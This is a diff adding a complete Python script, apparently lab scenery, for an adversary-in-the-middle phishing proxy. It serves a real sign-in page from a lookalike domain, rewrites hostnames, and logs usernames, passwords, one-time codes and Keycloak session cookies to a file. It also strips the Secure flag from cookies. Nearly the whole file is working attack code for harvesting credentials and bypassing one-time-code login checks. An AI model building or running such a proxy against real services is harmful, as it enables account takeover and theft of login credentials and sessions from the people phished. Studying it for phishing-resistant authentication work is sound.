@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+"""relay: an adversary-in-the-middle phishing proxy, lab scenery.
+
+It serves the shop's real sign-in page from a lookalike name
+(login.shop-help.test) by fetching every page live from the real provider
+(login.shop.test) and passing the person's answers straight back. It rewrites
+the real name to its own in what it returns, so the browser stays on the
+lookalike through the whole sign-in, and it writes to /srv/relay.log every
+form field it carries (the password, the one-time code) and every session
+cookie the real provider hands back. A password and a code can be relayed; a
+security key cannot, because the browser binds the key to the name in the
+address bar.
+"""
+
+import http.server
+import ssl
+import sys
+import urllib.parse
+import urllib.request
+import urllib.error
+
+REAL = "login.shop.test"
+FAKE = "login.shop-help.test"
+UPSTREAM = f"https://{REAL}"
+LOG = "/srv/relay.log"
+
+
+def note(line):
+    with open(LOG, "a") as out:
+        out.write(line + "\n")
+
+
+class Relay(http.server.BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"
+
+    def do_GET(self):
+        self.relay()
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length") or 0)
+        body = self.rfile.read(length) if length else b""
+        if b"password" in body or b"otp" in body or b"username" in body:
+            fields = urllib.parse.parse_qs(body.decode(errors="replace"))
+            for name in ("username", "password", "otp"):
+                if name in fields:
+                    note(f"caught {name}={fields[name][0]}")
+        self.relay(body)
+
+    def relay(self, body=None):
+        url = UPSTREAM + self.path
+        headers = {}
+        for name in ("Content-Type", "Cookie", "Accept", "User-Agent"):
+            if self.headers.get(name):
+                headers[name] = self.headers[name]
+        headers["Host"] = REAL
+        request = urllib.request.Request(
+            url, data=body, headers=headers, method=self.command
+        )
+        opener = urllib.request.build_opener(NoRedirect)
+        try:
+            answer = opener.open(request, timeout=20)
+        except urllib.error.HTTPError as error:
+            answer = error
+        except Exception as error:  # noqa: BLE001
+            self.send_error(502, str(error))
+            return
+        raw = answer.read()
+        out = raw.replace(REAL.encode(), FAKE.encode())
+        self.send_response(answer.status)
+        for name, value in answer.headers.items():
+            low = name.lower()
+            if low in ("transfer-encoding", "content-length", "connection"):
+                continue
+            if low == "set-cookie":
+                value = value.replace(REAL, FAKE).replace("; Secure", "")
+                if "KEYCLOAK_IDENTITY=" in value or "KEYCLOAK_SESSION=" in value:
+                    note("caught session cookie: " + value.split(";")[0])
+            if low == "location":
+                value = value.replace(REAL, FAKE)
+            self.send_header(name, value)
+        self.send_header("Content-Length", str(len(out)))
+        self.end_headers()
+        self.wfile.write(out)
+
+    def log_message(self, *_):
+        pass
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *_):
+        return None
+
+
+def main():
+    port = int(sys.argv[1]) if len(sys.argv) > 1 else 443
+    cert, key = sys.argv[2], sys.argv[3]
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(cert, key)
+    server = http.server.ThreadingHTTPServer(("0.0.0.0", port), Relay)
+    server.socket = context.wrap_socket(server.socket, server_side=True)
+    note(f"relay up on {port}, {FAKE} -> {REAL}")
+    server.serve_forever()
+
+
+if __name__ == "__main__":
+    main()
